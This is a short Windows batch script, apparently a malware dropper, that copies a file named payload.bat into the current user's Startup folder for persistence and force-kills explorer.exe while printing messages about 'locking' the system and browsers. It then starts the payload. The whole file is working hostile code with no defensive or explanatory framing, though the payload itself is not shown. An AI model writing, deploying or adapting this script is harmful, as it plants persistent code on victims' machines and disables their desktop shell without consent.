@echo off
title startup script
echo hooking into startup.
echo hooking into startup..
echo hooking into startup...
copy "payload.bat" C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\
echo locking system
echo locking browsers
taskkill /f /im explorer.exe
echo locking notepad
echo starting payload.
echo starting payload..
echo starting payload...
echo starting payload....
echo starting payload.....
echo payload started
start C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\payload.bat
exit

